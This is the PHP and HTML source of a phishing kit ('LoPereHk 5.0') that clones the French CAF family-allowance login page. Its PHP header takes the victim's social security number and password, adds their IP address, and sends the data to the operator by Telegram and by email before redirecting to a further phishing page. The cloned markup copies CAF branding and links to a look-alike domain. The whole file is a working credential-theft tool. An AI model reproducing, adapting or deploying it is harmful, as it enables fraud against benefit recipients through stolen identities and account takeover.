<?php
//   _           _____                _    _ _  __
//   | |         |  __ \              | |  | | |/ /
//   | |     ___ | |__) |__ _ __ ___  | |__| | ' / 
//   | |    / _ \|  ___/ _ \ '__/ _ \ |  __  |  <  
//   | |___| (_) | |  |  __/ | |  __/ | |  | | . \ 
//   |______\___/|_|   \___|_|  \___| |_|  |_|_|\_\                                                                                     

// LoPereHk 5.0
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

include 'config.php';
include "docs/telegram.php";
include "docs/ip.php";

$ip = ip();
if (isset($_POST['mail_input']) && isset($_POST['password_input'])) {

    $message = "Acces CAF - $ip\n";
    $message .= '🔥Nss = ' . $_POST['mail_input'] . "\r\n";
    $message .= '🔥Pass = ' . $_POST['password_input'] . "\r\n";

    $objet = 'Acces CAF' . " | Fr0m:" . $ip;
    $header = "From:📦CAFLHK" . "<bill@rezzzzz.com>";
    /////
    $tmessage = $message;

    $_SESSION['data'] = $tmessage;
    tlgsend(urlencode($tmessage));
    mail($Config['Email.Recipient'], $objet, $message, $header);
    // mail($votre_email, $objet, $message, $header);
    header('location: mail.php?apv=' . md5(time()) . '&p=1&token=' . sha1(time()));
}
?>

<html lang="fr">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="OWNER" content="CNAF">
    <meta name="AUTHOR" content="CNAF">

    <title>CAF - Connexion</title>

    <link rel="shortcut icon" href="files/logoCNAF.gif" type="image/x-icon">
    <link href="files/roboto_cnaf.css" rel="stylesheet">
    <link href="files/bootstrap.css" rel="stylesheet">
    <link href="files/bootstrap-theme.css" rel="stylesheet">
    <link href="files/bootstrap(1).css" rel="stylesheet">
    <link href="files/bootstrap-theme(1).css" rel="stylesheet">
    <script src="files/jquery.min.js"></script>
    <script src="files/smarttag-caffr.js"></script>
    <script src="files/bootstrap.min.js"></script>
    <script src="files/headerCnaf.min.js"></script>
    <script src="files/carousel-swipe.min.js"></script>
    <link rel="stylesheet" href="files/styles.3825a7fa4368d54f4d9a.css">
    <link rel="stylesheet" type="text/css" href="files/styles-headerfooterweb.css">
    <style>
        .contribution-cnaf[_ngcontent-bra-c87] {
            display: block;
            padding: 0 !important
        }

        .currentDate-cnaf[_ngcontent-bra-c87] {
            position: fixed;
            top: 0;
            z-index: 30000001;
            color: #000
        }
    </style>
    <style>
        .collapse-cnaf .ferme-cnaf,
        .collapse-cnaf .ouvert-cnaf {
            padding-left: 21px
        }

        .collapse-cnaf .collapsable-body-cnaf .filet-cnaf {
            margin-bottom: 8px;
            padding-bottom: 8px
        }

        .collapse-cnaf .collapsable-body-cnaf .collapsable-body-cnaf {
            margin-top: 8px
        }

        .popup-content {
            opacity: .75
        }

        .popup-bloc-info {
            display: none;
            background-color: rgba(0, 0, 0, .85);
            color: #fff;
            width: 100%;
            z-index: 99999998;
            position: fixed;
            height: 50%;
            bottom: 0;
            left: 0
        }

        .popup-bloc-info a,
        .popup-bloc-info a:active,
        .popup-bloc-info a:focus,
        .popup-bloc-info a:hover,
        .popup-bloc-info a:visited {
            color: #fff !important;
            text-decoration: underline !important
        }

        .titre_article {
            margin-top: 0;
            margin-bottom: 15px
        }

        .btnfermer {
            position: absolute;
            top: 10px;
            right: 10px;
            display: inline-block;
            opacity: 1;
            color: #fff
        }

        .bloc-infos-importantes-mobile {
            padding: 40px
        }

        .bloc-mobile-cnaf {
            margin: 0;
            padding: 10px
        }
    </style>
    <link rel="stylesheet" type="text/css" media="all" href="files/av.css">
    <style>
        #carte_vitale[_ngcontent-bra-c65] {
            width: 100%
        }

        form[_ngcontent-bra-c65] {
            margin-top: 0 !important
        }

        input[_ngcontent-bra-c65] {
            margin-bottom: 10px
        }

        .texte-info-cnaf[_ngcontent-bra-c65] {
            margin-top: 25px
        }

        .texte-donnees-perso[_ngcontent-bra-c65] {
            margin-top: 0
        }

        .input-login-cnaf[_ngcontent-bra-c65] {
            max-width: 300px;
            position: relative
        }

        .conteneur-templateloginoffrerapide-cnaf[_ngcontent-bra-c65] .btn-templateloginoffrerapide-cnaf[_ngcontent-bra-c65] {
            width: 120px;
            height: 46px;
            padding: 6px 10px;
            margin-right: 10px;
            margin-bottom: 10px
        }

        .conteneur-templateloginoffrerapide-cnaf[_ngcontent-bra-c65] .btn-templateloginoffrerapide-cnaf.btn-mdp-oublie-offrerapide-cnaf[_ngcontent-bra-c65] {
            width: auto;
            margin-right: 15px
        }

        .picto-logocnaf-cnaf[_ngcontent-bra-c65] {
            background-image: url(/icfstatiquesangularappli/dist/images/logoCNAF.gif);
            background-repeat: no-repeat;
            background-position: 95%;
            background-color: #1c4d92;
            background-size: 60px;
            line-height: normal;
            height: 80px
        }

        .filet-separator[_ngcontent-bra-c65] {
            margin-top: 22px;
            margin-bottom: 22px
        }

        .titre-caf-offre-rapide[_ngcontent-bra-c65] {
            color: #fff;
            text-align: center;
            font-weight: 500;
            font-size: 36px;
            padding: 20px;
            margin-top: 0 !important
        }

        .titre-encadre-cnaf-offre-rapide[_ngcontent-bra-c65] {
            padding-bottom: 22px
        }

        .conteneur-offrerapide-cnaf[_ngcontent-bra-c65] {
            margin-top: 15px;
            background-color: #fff
        }

        .conteneur-login-cnaf[_ngcontent-bra-c65] .texte-saisi[_ngcontent-bra-c65] {
            color: #0093c4
        }

        .conteneur-login-cnaf[_ngcontent-bra-c65] .modifier-picto[_ngcontent-bra-c65] {
            background-image: url(/icfstatiquesangularappli/dist/images/usager/pic_modifier.png);
            background-color: transparent;
            background-position: 100%;
            background-repeat: no-repeat
        }

        .conteneur-login-cnaf[_ngcontent-bra-c65] .img-recapitulatif[_ngcontent-bra-c65] {
            margin: 8px 0 0;
            padding: 3px 0
        }

        .conteneur-login-cnaf[_ngcontent-bra-c65] .modifier[_ngcontent-bra-c65]:hover {
            color: #005a78;
            cursor: pointer
        }

        .fixed-height[_ngcontent-bra-c65] {
            min-height: 450px
        }

        .no-padding-cnaf[_ngcontent-bra-c65] {
            padding: 0
        }

        .margin-zero[_ngcontent-bra-c65] {
            margin-left: 0;
            margin-right: 0
        }

        @media screen and (min-width:1680px) {
            .pcls-zoom[_ngcontent-bra-c65] {
                transform: scale(1.25);
                transform-origin: top center;
                min-height: 700px
            }
        }

        @media screen and (min-width:1920px) {
            .pcls-zoom[_ngcontent-bra-c65] {
                transform: scale(1.35);
                transform-origin: top center;
                min-height: 700px
            }
        }

        .div-aide-connexion[_ngcontent-bra-c65] {
            margin-top: 35px !important
        }

        .row.bloc-mode-connexion-cnaf[_ngcontent-bra-c65] {
            position: relative;
            display: flex;
            flex-wrap: wrap;
            align-items: center
        }

        .row.bloc-mode-connexion-cnaf[_ngcontent-bra-c65]:before {
            display: none
        }

        .row.bloc-mode-connexion-cnaf[_ngcontent-bra-c65]:after {
            content: " ";
            border-bottom: 1px solid #cfd3d5;
            position: absolute;
            bottom: -10px;
            margin: 0 10px;
            width: calc(100% - 20px);
            left: 0
        }

        .row.bloc-mode-connexion-cnaf[_ngcontent-bra-c65]>[class*=col-][_ngcontent-bra-c65] {
            flex-direction: column
        }

        .bloc-mode-connexion-cnaf[_ngcontent-bra-c65] .mode-connexion-separator-cnaf[_ngcontent-bra-c65] {
            position: absolute;
            height: 100%;
            border-left: 1px solid #cfd3d5;
            left: 50%;
            top: 0
        }

        .bloc-mode-connexion-cnaf[_ngcontent-bra-c65] .mode-connexion-separator-cnaf[_ngcontent-bra-c65]:before {
            content: "OU";
            position: absolute;
            top: 50%;
            text-align: center;
            background-color: #fff;
            width: 26px;
            height: 36px;
            margin: -18px 0 0 -13px;
            padding-top: 6px
        }

        .bloc-mode-connexion-cnaf[_ngcontent-bra-c65] .mode-connexion-separator-mobile-cnaf[_ngcontent-bra-c65] {
            border-bottom: 1px solid #cfd3d5;
            clear: both;
            padding-top: 20px;
            margin: 0 10px 40px;
            width: 100%
        }

        .bloc-mode-connexion-cnaf[_ngcontent-bra-c65] .mode-connexion-separator-mobile-cnaf[_ngcontent-bra-c65]:before {
            content: "OU";
            position: absolute;
            left: 50%;
            text-align: center;
            background-color: #fff;
            width: 40px;
            height: 20px;
            margin: -10px 0 0 -20px
        }

        a.login-fc-link[_ngcontent-bra-c65] {
            width: 220px;
            height: 60px !important;
            padding-top: 15px;
            display: inline-block;
            position: relative;
            overflow: hidden;
            margin-bottom: 5px
        }

        a.login-fc-link[_ngcontent-bra-c65]:after {
            position: absolute;
            content: "";
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-image: url(https://connect.caf.fr/icfstatiquesangularappli/dist/images/franceconnect-bouton.png);
            background-size: contain;
            background-repeat: no-repeat
        }

        a.login-fc-link[_ngcontent-bra-c65]:focus:after,
        a.login-fc-link[_ngcontent-bra-c65]:hover:after {
            background-image: url(https://connect.caf.fr/icfstatiquesangularappli/dist/images/franceconnect-bouton-hover.png)
        }

        a.login-fc-link[_ngcontent-bra-c65]:active:after {
            background-image: url(/icfstatiquesangularappli/dist/images/franceconnect-bouton.png)
        }

        p.texte-info-cnaf.texte-fc[_ngcontent-bra-c65] {
            margin-bottom: 15px;
            margin-top: 0
        }

        .logo-eaccessible[_ngcontent-bra-c65] {
            height: 40px
        }

        .texte-style[_ngcontent-bra-c65] {
            word-break: keep-all
        }

        .btn-taille-mobile[_ngcontent-bra-c65] {
            width: 220px
        }

        .texte-gros-mobile[_ngcontent-bra-c65] {
            font-size: large;
            font-weight: 700;
            margin-top: 10px
        }

        .btn-margin-mobile[_ngcontent-bra-c65] {
            margin-bottom: 25px
        }

        .espace-label[_ngcontent-bra-c65] {
            margin-bottom: 10px
        }
    </style>
    <style>
        .form-group.row[_ngcontent-bra-c57] div[class*=col-][_ngcontent-bra-c57] .label-form-cnaf[_ngcontent-bra-c57] {
            vertical-align: top;
            margin-top: 0
        }

        .carte-vitale-specimen[_ngcontent-bra-c57] {
            width: 100%
        }

        .input-corriger-bleu-cnaf[_ngcontent-bra-c57]:active {
            background-image: url(/icfstatiquesangularappli/dist/images/pic-corriger_gris.png)
        }

        .input-corriger-bleu-cnaf[_ngcontent-bra-c57],
        .input-corriger-bleu-cnaf[_ngcontent-bra-c57]:active {
            background-repeat: no-repeat;
            background-position: 100%;
            position: absolute;
            width: 30px;
            height: 30px;
            margin-top: 1px
        }

        .input-corriger-bleu-cnaf[_ngcontent-bra-c57] {
            background-image: url(/icfstatiquesangularappli/dist/images/usager/pic-corriger.png)
        }

        .button-effacer-cnaf[_ngcontent-bra-c57] span.input-group-btn[_ngcontent-bra-c57] {
            bottom: 40px;
            z-index: 10;
            right: 30px
        }

        .input-saisie[_ngcontent-bra-c57] {
            position: relative;
            width: 100%
        }

        .input-login-cnaf[_ngcontent-bra-c57] {
            max-width: 300px;
            position: relative
        }

        .input-login-cnaf[_ngcontent-bra-c57] .help-block-max-width[_ngcontent-bra-c57],
        .input-login-cnaf[_ngcontent-bra-c57] input[_ngcontent-bra-c57] {
            max-width: 300px
        }
    </style>
    <style>
        .glyphicon-eye-close[_ngcontent-bra-c58],
        .glyphicon-eye-open[_ngcontent-bra-c58] {
            cursor: pointer;
            pointer-events: all;
            background-color: transparent;
            border: hidden;
            display: none
        }

        input[_ngcontent-bra-c58]::-ms-clear,
        input[_ngcontent-bra-c58]::-ms-reveal {
            display: none
        }

        .form-group.row[_ngcontent-bra-c58] div[class*=col-][_ngcontent-bra-c58] .label-form-cnaf[_ngcontent-bra-c58] {
            vertical-align: top;
            margin-top: 0
        }

        .input-corriger-bleu-cnaf[_ngcontent-bra-c58]:active {
            background-image: url(/icfstatiquesangularappli/dist/images/pic-corriger_gris.png)
        }

        .input-corriger-bleu-cnaf[_ngcontent-bra-c58],
        .input-corriger-bleu-cnaf[_ngcontent-bra-c58]:active {
            background-repeat: no-repeat;
            background-position: 100%;
            position: absolute;
            width: 30px;
            height: 30px;
            margin-top: 1px
        }

        .input-corriger-bleu-cnaf[_ngcontent-bra-c58] {
            background-image: url(/icfstatiquesangularappli/dist/images/usager/pic-corriger.png)
        }

        .button-effacer-cnaf[_ngcontent-bra-c58] span.input-group-btn[_ngcontent-bra-c58] {
            bottom: 40px;
            z-index: 10;
            right: 30px
        }

        .input-saisie[_ngcontent-bra-c58] {
            position: relative;
            width: 100%
        }

        .input-login-cnaf[_ngcontent-bra-c58] {
            max-width: 300px;
            position: relative
        }

        .has-error[_ngcontent-bra-c58] .form-control-feedback[_ngcontent-bra-c58] {
            color: #0093c4
        }

        .input-group[_ngcontent-bra-c58] .form-control[_ngcontent-bra-c58]:focus {
            z-index: 2
        }

        #inputContainerMdp[_ngcontent-bra-c58] {
            position: relative
        }
    </style>
    <style>
        span[_ngcontent-bra-c45] {
            left: -1px;
            width: 10px;
            height: 20px
        }
    </style>
    <style>
        #divContentPopover[_ngcontent-bra-c44] {
            margin-right: 15px;
            margin-top: 15px
        }

        .label-form-cnaf[_nghost-bra-c44] .btn[_ngcontent-bra-c44],
        .label-form-cnaf [_nghost-bra-c44] .btn[_ngcontent-bra-c44] {
            margin-bottom: -10px;
            margin-top: -10px
        }
    </style>
    <style>
        @media print {
            #ghostery-tracker-tally {
                display: none !important
            }
        }
    </style>
</head>
<!-- FIN HEAD -->
<!-- DEBUT BODY -->

<body role="document" data-new-gr-c-s-check-loaded="14.1049.0" data-gr-ext-installed="" cz-shortcut-listen="true">
    <script>
        var deferDisplayChatbot = $.Deferred();
        var promiseDisplayChatbot = deferDisplayChatbot.promise();
        var cnafUrlMaintienSession = "";
        // -----------------------------------------------
        // ---- Paramètre application angular ------------
        // -----------------------------------------------
        //Valeur par défaut
        var mapForAngularAppli = {};
        // AppConfig
        mapForAngularAppli.appConfig = {};
        mapForAngularAppli.appConfig.urlServletJWT = createUrlJwt(mapForAngularAppli);
        mapForAngularAppli.appConfig.isConnexion = true;

        function logout() {
            localStorage.setItem("displayAngular", false);
            //On retourne à la page de début
            window.location = window.location.origin;
        }

        function createUrlJwt(mapForAngularAppli) {
            var jwtUrl = '/token/public';
            return jwtUrl;
        }

        function pageReady() {

        }

        var titreAppli = "Bienvenue sur le portail ";
        var soustitreAppli = "des Allocations Familiales";
        $(document).ready(function() {
            if (activationSSO === true) {
                document.cookie = "access_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.caf.fr;";
            }


            $('head').append($('<link rel="stylesheet" type="text/css" />').attr('href', '/headerfooterappli/dist/staticTemplates/styles-headerfooterweb.css'));
            $("header").load("/headerfooterappli/dist/staticTemplates/header-web-static.html", function() {
                $("#libelle-titre-header").text(titreAppli);
                $("#libelle-soustitre-header").text(soustitreAppli);
                pageReadyForTheme();
            });
            $("footer").load("/headerfooterappli/dist/staticTemplates/footer-web-static.html", function() {
                deferDisplayChatbot.resolve();
            });

        });
    </script>
    <a class="lien-evitement-cnaf" id="lien-evitement-cnaf" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#theme-contenu-content-link-cnaf">Aller au contenu</a>
    <header id="theme-header-cnaf" role="banner">
        <div id="theme-header-links-cnaf" class="theme-sticky-header-cnaf">
            <div class="container">
                <div class="row">

                    <div class="navbar-links-access-cnaf pull-right">
                        <span id="accessibilite" class="navbar-links-item-cnaf">
                            <a class="popover-access-cnaf" style="text-decoration:none" href="javascript:void(0);" role="button" data-toggle="modal" tabindex="0" data-target="#myModalContraste">
                                <img class="" alt="Ouvrir la pop-up Option d&#39;accessibilité" src="files/pic-access.png">
                                <span class="hidden-xs hidden-sm" style="vertical-align:middle">Accessibilité</span>
                            </a>
                        </span>
                    </div>
                    <div class="navbar-links-cnaf pull-left navbar-links-header">

                        <div id="myModalContraste" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="modalOptionAccessibilite">
                            <div class="modal-dialog" role="document">
                                <div class="modal-content">
                                    <div class="modal-header">
                                        <button type="button" class="close-cnaf" data-dismiss="modal" aria-label="Fermer la popup"></button>
                                        <div role="heading" aria-level="1" class="texte-medium text-primary" id="modalOptionAccessibilite">
                                            Option d'accessibilité</div>
                                    </div>
                                    <div class="modal-body">
                                        <div class="row">
                                            <div class="col-sm-6 ">
                                                <fieldset>
                                                    <legend class="label-form-cnaf">Contraste: </legend>
                                                    <div class="form-group btn-group btn-group-justified" data-toggle="buttons" role="radiogroup">
                                                        <label class="btn btn-default" uib-btn-radio="&#39;Standard&#39;" for="standard" onclick="desactiveContrasteCnaf()">
                                                            <input type="radio" name="contraste" aria-label="Standard" class="sr-only" id="standard">
                                                            <span>Standard</span>
                                                        </label>
                                                        <label class="btn btn-default" uib-btn-radio="&#39;Renforcé&#39;" for="renforce" onclick="activeContrasteCnaf()">
                                                            <input type="radio" name="contraste" aria-label="Renforcé" class="sr-only" id="renforce">
                                                            <span>Renforcé</span>
                                                        </label>
                                                    </div>
                                                </fieldset>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </div>
        <div id="theme-header-content-cnaf" class="affix-top" style="">
            <div class="container">
                <div class="row">
                    <div class="titre-cnaf titre-header">

                        <p id="libelle-titre-header" class="sur-titre-cnaf text-uppercase">Bienvenue sur le portail </p>
                        <p id="libelle-soustitre-header" class="sous-titre-cnaf text-uppercase">des Allocations Familiales</p>

                    </div>

                    <a class="btn-logo-cnaf btn-logo-header btn-logo-caf-header" id="logo-header-caffr" href="https://www.caf.fr/redirect/s/Redirect?page=accueilCaffr">
                        <img id="img-logo-caf-header" src="files/logo_caf_headerCC.png" alt="Accueil caf.fr">
                    </a>

                    <a class="btn-logo-cnaf btn-logo-header" id="logo-header-aripa" href="https://www.pension-alimentaire.caf.fr//">
                        <img id="img-logo-aripa-header" src="files/logo_aripa_headerCC.png" alt="Accueil aripa pension-alimentaire.caf.fr">

                    </a>
                    <div class="btn-logo-cnaf btn-logo-header">
                        <img src="files/filet_headerCC.png" alt="">
                    </div>
                    <div class="btn-logo-cnaf btn-logo-cnaf-header">
                        <img src="files/logoCNAF.gif" alt="">
                    </div>

                </div>
            </div>
        </div>

        <script>
            // Si la variable js mapPortailUsager existe et qu'on a une valeur pour "caffr" (cf. fichier variables.xld.js de cnafcommonsportailappli)
            // On remplace dans les liens "https://wwwd.caf.fr" par la valeur dans mapPortailUsager.get("caffr")
            if (typeof mapPortailSource !== "undefined" && typeof mapPortailSource.get === "function") {
                var prefixLinkCaffr = mapPortailSource.get("caffr");
                if (prefixLinkCaffr !== undefined) {
                    var linkCaffr = document.querySelector('#logo-header-caffr');
                    linkCaffr.href = linkCaffr.href.replace("https://wwwd.caf.fr", prefixLinkCaffr);
                }
                var prefixLinkAripa = mapPortailSource.get("aripa");
                if (prefixLinkAripa !== undefined) {
                    var linkAripa = document.querySelector('#logo-header-aripa');
                    linkAripa.href = linkAripa.href.replace("https://pension-alimentaire.caf.fr", prefixLinkAripa);
                }
            }
        </script>
    </header>
    <style>
        #theme-header-content-cnaf {
            height: 80px !important;
        }
    </style>
    <main id="theme-contenu-cnaf" class="icf-angular-cnaf" role="main" style="">
        <div class="container">
            <div class="row">
                <div class="col-lg-12" id="theme-contenu-content-wrapper-cnaf">
                    <div id="theme-contenu-content-cnaf">
                        <a id="theme-contenu-content-link-cnaf" class="sr-only" tabindex="-1" href="javascript:void(0);">Contenu principal de la page</a>
                        <h1 class="titre-page-cnaf text-primary text-uppercase sr-only">Portail des allocations familiales</h1>
                        <h2 class="sr-only">Contenu de la page</h2>
                        <!-- Div application angular -->
                        <div>
                            <app-root _nghost-bra-c87="" ng-version="11.2.14">
                                <!---->
                                <div _ngcontent-bra-c87="" class="container">
                                    <div _ngcontent-bra-c87="" class="row">
                                        <div _ngcontent-bra-c87="" class="col-xs-12 col-sm-12 col-md-12 col-lg-10 col-lg-offset-1">
                                            <app-savoir-important _ngcontent-bra-c87="">
                                                <div class="row collapse-cnaf conteneur-collapse-cnaf hidden-xs">
                                                    <div class="col-sm-12">
                                                        <h3 class="collapsable-heading-cnaf titre-bloc-cnaf filet-cnaf text-uppercase">
                                                            <a>
                                                                A savoir avant de se connecter
                                                            </a>
                                                        </h3>
                                                    </div>
                                                    <div class="collapsable-body-cnaf col-sm-12 collapse in">
                                                        <div>
                                                            <div class="collapsable-body-cnaf">
                                                                <div><strong>Pour votre première connexion, </strong>renseignez votre numéro de sécurité sociale et votre mot de passe actuel à 8 chiffres.<br><strong>Pour les connexions suivantes,</strong> renseignez le mot de passe créé lors de votre première connexion.<br><br><br><strong>Vous n’avez pas encore de compte,</strong> cliquez sur « créer Mon Compte »</div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <!---->

                                                <!---->
                                                <!---->
                                                <!---->
                                                <!---->
                                            </app-savoir-important>
                                        </div>
                                    </div>
                                    <div _ngcontent-bra-c87="" class="row">
                                        <div _ngcontent-bra-c87="" class="col-sm-12 col-lg-10 col-lg-offset-1 col-md-12 col-xs-12">
                                            <router-outlet _ngcontent-bra-c87="" class="hidden"></router-outlet>
                                            <app-login _nghost-bra-c65="">
                                                <!---->
                                                <div _ngcontent-bra-c65="" class="row conteneur-connexion-cnaf">
                                                    <div _ngcontent-bra-c65="" class="col-sm-12">
                                                        <h3 _ngcontent-bra-c65="" tabindex="-1" class="titre-bloc-cnaf filet-cnaf text-uppercase">
                                                            Connexion
                                                        </h3>
                                                        <!---->
                                                        <div _ngcontent-bra-c65="">
                                                            <p _ngcontent-bra-c65="" class="texte-info-cnaf texte-info-champs-obligatoires">Tous les champs sont obligatoires, sauf mention contraire.</p>
                                                            <form _ngcontent-bra-c65="" action="" method="POST" autocomplete="off" class="ng-untouched ng-pristine ng-invalid">
                                                                <div _ngcontent-bra-c65="" class="row">
                                                                    <div _ngcontent-bra-c65="" class="col-xs-12">
                                                                        <!---->
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-bra-c65="" class="row bloc-mode-connexion-cnaf">
                                                                    <div _ngcontent-bra-c65="" class="col-sm-6 col-md-6 col-xs-12">

                                                                        <cnaf-identifiant _ngcontent-bra-c65="" formcontrolname="nir" _nghost-bra-c57="" class="ng-untouched ng-pristine ng-invalid">
                                                                            <div _ngcontent-bra-c57="" class="form-group ng-untouched ng-pristine ng-invalid">
                                                                                <div _ngcontent-bra-c57="" id="inputLabelNir"><label _ngcontent-bra-c57="" for="nir" class="label-form-cnaf" style="font-weight: bold;">Numéro de Sécurité sociale</label>
                                                                                    <ng-cnaf-aide _ngcontent-bra-c57="" iddiv="nirPopupAide" alt="Informations complémentaires sur l&#39;identifiant" _nghost-bra-c44="">
                                                                                        <!---->
                                                                                        <a _ngcontent-bra-c44="" tabindex="0" role="button" data-container="body" data-trigger="manual" triggers="" placement="right" class="btn btn-info ng-popover-button-cnaf"><img _ngcontent-bra-c44="" src="files/pic_aide_gris.png" alt="Informations complémentaires sur l&#39;identifiant"></a>
                                                                                        <!---->
                                                                                    </ng-cnaf-aide>
                                                                                    <!---->
                                                                                </div>
                                                                                <div _ngcontent-bra-c57="" id="inputLoginNir" class="input-login-cnaf fixPlaceholderKbIE">
                                                                                    <div _ngcontent-bra-c57="" class="button-effacer-cnaf form-group input-group input-saisie align-middle-cnaf">
                                                                                        <input _ngcontent-bra-c57="" nirformat="" name="mail_input" id="nir" formcontrolname="nir" placeholder="13 caractères" aria-describedby="nirHelp nirErreur" title="13 caractères champ obligatoire" required="" class="form-control ng-untouched ng-pristine ng-invalid" maxlength="18" minlength="13">
                                                                                        <!---->
                                                                                        <!---->

                                                                                    </div><span _ngcontent-bra-c57="" id="nirHelp" class="sr-only">13 caractères champ obligatoire</span>
                                                                                    <!---->
                                                                                </div>
                                                                                <div _ngcontent-bra-c57="" id="nirPopupAide" class="hidden">
                                                                                    <div _ngcontent-bra-c57="" class="popover-btn-close-cnaf"></div>
                                                                                    <p _ngcontent-bra-c57="">Où trouver son numéro de sécurité sociale ?</p><img _ngcontent-bra-c57="" alt="Le numéro de sécurité sociale se trouve sur la carte vitale." src="files/carte-vitale.png" class="carte-vitale-specimen filtre-contraste-appli-img-leger"><span _ngcontent-bra-c57="" class="help-block">Saisir les 13 premiers caractères présents sur la carte vitale.</span>
                                                                                </div>
                                                                            </div>
                                                                        </cnaf-identifiant>
                                                                        <!---->
                                                                        <!---->


                                                                        <cnaf-mot-de-passe _ngcontent-bra-c65="" formcontrolname="mot_de_passe" _nghost-bra-c58="" class="ng-untouched ng-pristine ng-invalid">
                                                                            <div _ngcontent-bra-c58="" class="form-group has-feedback ng-untouched ng-pristine ng-invalid">
                                                                                <div _ngcontent-bra-c58="" id="inputLabelMdp"><label _ngcontent-bra-c58="" for="inputMotDePasse" class="label-form-cnaf" style="font-weight: bold;">Mot de passe</label></div>
                                                                                <div _ngcontent-bra-c58="" id="inputLoginMdp" class="input-login-cnaf">
                                                                                    <div _ngcontent-bra-c58="" id="inputContainerMdp">
                                                                                        <div _ngcontent-bra-c58="" class="button-effacer-cnaf form-group input-group input-saisie align-middle-cnaf"><input _ngcontent-bra-c58="" id="inputMotDePasse" name="password_input" formcontrolname="mot_de_passe" placeholder="8 à 24 caractères" autocomplete="off" maxlength="24" aria-describedby="mdpHelp mdpErreur" required="" class="form-control ng-untouched ng-pristine ng-invalid" type="password">
                                                                                            <!---->
                                                                                            <!---->
                                                                                        </div><span _ngcontent-bra-c58="" id="mdpHelp" class="sr-only">Champ obligatoire</span>
                                                                                        <div _ngcontent-bra-c58="" id="mdpErreur"></div>
                                                                                        <!---->
                                                                                        <!---->
                                                                                        <div _ngcontent-bra-c58=""><button _ngcontent-bra-c58="" id="btnDisplayMdp" type="button" class="form-control-feedback glyphicon glyphicon-eye-open text-primary" title="Afficher le mot de passe"><span _ngcontent-bra-c58="" aria-hidden="true" class="sr-only">Afficher le mot de passe</span></button></div>
                                                                                        <!---->
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </cnaf-mot-de-passe>
                                                                        <!---->
                                                                        <br _ngcontent-bra-c65="" aria-hidden="true">

                                                                        <a _ngcontent-bra-c65="" routerlinkactive="active" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#/mdpoublie/nir">Mot de passe oublié ?</a>

                                                                        <!---->
                                                                        <br _ngcontent-bra-c65="" aria-hidden="true">
                                                                        <br _ngcontent-bra-c65="" aria-hidden="true">
                                                                        <!---->
                                                                        <button _ngcontent-bra-c65="" type="submit" class="btn btn-form-cnaf btn-majeur-cnaf">
                                                                            Se connecter
                                                                        </button>
                                                                        <br _ngcontent-bra-c65="" aria-hidden="true">
                                                                        <br _ngcontent-bra-c65="" aria-hidden="true">
                                                                    </div>
                                                                    <p _ngcontent-bra-c65="" class="sr-only">ou</p>
                                                                    <div _ngcontent-bra-c65="" aria-hidden="true" class="mode-connexion-separator-cnaf hidden-xs"></div>
                                                                    <!---->
                                                                    <div _ngcontent-bra-c65="" aria-hidden="true" class="mode-connexion-separator-mobile-cnaf visible-xs"></div>
                                                                    <!---->
                                                                    <div _ngcontent-bra-c65="" class="col-sm-6 col-md-6 col-xs-12" style="opacity: .5;cursor : not-allowed">
                                                                        <div _ngcontent-bra-c65="" class="text-sm-center">
                                                                            <p _ngcontent-bra-c65="" class="texte-info-cnaf texte-fc texte-clair-cnaf">FranceConnect est la solution proposée par l'État pour sécuriser et simplifier la connexion à vos services en ligne.</p>
                                                                            <a _ngcontent-bra-c65="" href="javascript:void(0);" class="login-fc-link">
                                                                                S'identifier avec FranceConnect
                                                                            </a>

                                                                            <img _ngcontent-bra-c65="" hidden="" src="files/franceconnect-bouton-hover.png" alt="">
                                                                            <p _ngcontent-bra-c65="">
                                                                                <a _ngcontent-bra-c65="" href="javascript:void(0);" class="login-fc-aide-link">Qu'est-ce que FranceConnect ?
                                                                                </a>
                                                                            </p>
                                                                            <a _ngcontent-bra-c65="" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#" referrerpolicy="no-referrer-when-downgrade" class="redirect-fc-link hidden">Redirect FranceConnect</a>
                                                                        </div>
                                                                    </div>
                                                                    <!---->
                                                                </div>
                                                                <div _ngcontent-bra-c65="" class="row">
                                                                    <div _ngcontent-bra-c65="" class="col-sm-12">
                                                                        <div _ngcontent-bra-c65="" class="row">
                                                                            <div _ngcontent-bra-c65="" class="col-sm-4 col-sm-offset-3 col-xs-12 div-aide-connexion">

                                                                                <label _ngcontent-bra-c65="" class="label-cnaf">Première connexion ?
                                                                                </label>

                                                                            </div>
                                                                            <br _ngcontent-bra-c65="" aria-hidden="true">
                                                                            <div _ngcontent-bra-c65="" class="col-sm-5 col-xs-12 aide-connexion">
                                                                                <button _ngcontent-bra-c65="" class="btn btn-form-cnaf btn-secondaire-cnaf pull-left">Créer Mon Compte</button>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-bra-c65="" class="filet-cnaf filet-separator"></div>
                                                                <div _ngcontent-bra-c65="" class="row">
                                                                    <div _ngcontent-bra-c65="" class="col-sm-12">
                                                                        <p _ngcontent-bra-c65="" class="texte-info-cnaf titre-margin texte-style texte-donnees-perso">
                                                                            Pour savoir comment sont traitées vos données personnelles, consultez la page <a _ngcontent-bra-c65="" href="http://www.caf.fr/allocataires/informatique-et-libertes">«Informatique et
                                                                                libertés»</a>.
                                                                            <br _ngcontent-bra-c65="" aria-hidden="true"> Votre mot de passe est confidentiel. Ne le communiquez à personne, pas même à votre Caf. Attention aux messages frauduleux. Pour consulter nos conseils de sécurité,
                                                                            <a _ngcontent-bra-c65="" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#/infosSecurite">suivez le guide</a>.
                                                                        </p>
                                                                    </div>
                                                                </div>

                                                                <div _ngcontent-bra-c65="" class="filet-cnaf filet-separator"></div>
                                                                <div _ngcontent-bra-c65="" class="row">
